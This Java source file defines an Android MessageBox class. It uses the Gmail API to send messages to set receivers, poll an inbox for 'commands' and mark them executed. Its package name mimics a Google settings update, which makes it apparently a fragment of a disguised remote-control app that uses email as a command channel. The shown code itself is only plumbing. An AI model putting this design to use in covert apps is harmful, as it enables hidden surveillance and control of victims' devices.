package com.setting.dl.google.googlesettingupdate.ptt.box;

import android.content.Context;
import android.support.annotation.Nullable;

import com.google.api.services.gmail.Gmail;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.IInboxChecker;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;

import java.util.List;

public class MessageBox implements IMessagebox, IMessageSentListener, IInboxChecker {
   
   //private final Context  context;
   private IOutbox  outbox;
   private IInbox   inbox;
   private ISentbox sentbox;
   
   
   public MessageBox(Context context, Gmail gmail, String sender, List<String> recievers, List<String> inboxLabels, String queryFrom, String queryTo) {
      
      //this.context = context;
      outbox = new MessageOutbox(context, gmail, sender, recievers, this);
      sentbox = new MessageSentbox(gmail, queryTo);
      inbox = new MessageInbox(context, gmail, inboxLabels, queryFrom);
   }
   
   @Override
   synchronized public void addToOutbox(IMessage message) {
      
      outbox.addToOutbox(message);
   }
   
   
   @Override
   public void onMessageSent(IMessage message) {
   
      if (message.getId() != null) {
   
         sentbox.addToSentbox(message.getId());
      }
      
      inbox.onMessageSent(message);
      checkInbox();
   }
   
   
   @Override
   synchronized
   public void checkInbox() {
      
      inbox.checkInbox();
   }
   
   @Override
   public void onCheckComplete(@Nullable String commandId) {
      
      inbox.onCheckComplete(commandId);
   }
   
   @Override
   synchronized
   public void checkSent() {
      
      sentbox.checkSent();
   }
   
   @Override
   public void setCommandExecuted(String id, String comment) {
      
      inbox.setCommandExecuted(id, comment);
   }
   
   @Override
   public void setCommandExecuting(boolean isExecuting, String id, String comment) {
      inbox.setCommandExecuting(isExecuting, id, comment);
   }
   
   @Override
   public IInbox getInbox() {
      return inbox;
   }
}
